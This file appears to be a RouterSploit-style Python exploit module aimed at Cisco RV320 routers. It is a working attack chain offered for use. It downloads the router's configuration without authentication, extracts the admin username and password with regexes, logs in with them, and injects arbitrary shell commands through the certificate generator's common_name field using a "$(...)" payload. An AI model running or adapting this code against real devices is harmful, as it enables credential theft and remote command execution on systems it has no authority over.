# rsf exploit module
# description: Module exploits Cisco RV320 Remote Command Injection vulnerability in the web-based certificate generator feature.

import requests
import re

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 443
        self.command = ""
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            config = self.get_config()
            if not config:
                print("[-] Config extraction failed")
                return
                
            username, password = self.extract_creds(config)
            if not username or not password:
                print("[-] Credentials not found")
                return
                
            if self.cisco_login(username, password):
                self.execute_command(self.command)
            else:
                print("[-] Login failed")
        else:
            print("[-] Target not vulnerable")

    def get_config(self):
        try:
            response = self.session.get(
                f"https://{self.target}:{self.port}/cgi-bin/config.exp",
                verify=False
            )
            return response.text if response and "sysconfig" in response.text else None
        except:
            return None

    def extract_creds(self, config):
        username = re.findall('USERNAME=(.*?)\n', config)
        password = re.findall('PASSWD=(.*?)\n', config)
        return (username[0] if username else None, password[0] if password else None)

    def extract_auth_key(self):
        try:
            response = self.session.get(
                f"https://{self.target}:{self.port}/cgi-bin/userLogin.cgi",
                verify=False
            )
            if response:
                auth_key = re.findall(r'"auth_key" value="(.*?)">', response.text)
                return auth_key[0] if auth_key else "1964300002"
        except:
            return "1964300002"

    def cisco_login(self, username, password):
        auth_key = self.extract_auth_key()
        
        data = {
            "auth_key": auth_key,
            "auth_server_pw": "Y2lzY28=",
            "changelanguage": "",
            "current_password": "",
            "langName": "ENGLISH,Deutsch,Espanol,Francais,Italiano",
            "LanguageList": "ENGLISH",
            "login": "true",
            "md5_old_pass": "",
            "new_password": "",
            "password": password,
            "password_expired": 0,
            "pdStrength": 0,
            "portalname": "CommonPortal",
            "re_new_password": "",
            "submitStatus": 0,
            "username": username
        }
        
        try:
            response = self.session.post(
                f"https://{self.target}:{self.port}/cgi-bin/userLogin.cgi",
                data=data,
                verify=False
            )
            return response and "URL=/default.htm" in response.text
        except:
            return False

    def execute_command(self, command):
        payload = f"a'$({command})'b"
        
        data = {
            "page": "self_generator.htm",
            "totalRules": 1,
            "OpenVPNRules": 30,
            "submitStatus": 1,
            "log_ch": 1,
            "type": 4,
            "Country": "A",
            "state": "A",
            "locality": "A",
            "organization": "A",
            "organization_unit": "A",
            "email": "ab%40example.com",
            "KeySize": 512,
            "KeyLength": 1024,
            "valid_days": 30,
            "SelectSubject_c": 1,
            "SelectSubject_s": 1,
            "common_name": payload
        }
        
        try:
            self.session.post(
                f"https://{self.target}:{self.port}/certificate_handle2.htm?type=4",
                data=data,
                verify=False
            )
            print("[+] Command executed (blind)")
        except:
            print("[-] Command execution failed")

    def check(self):
        return self.get_config() is not None
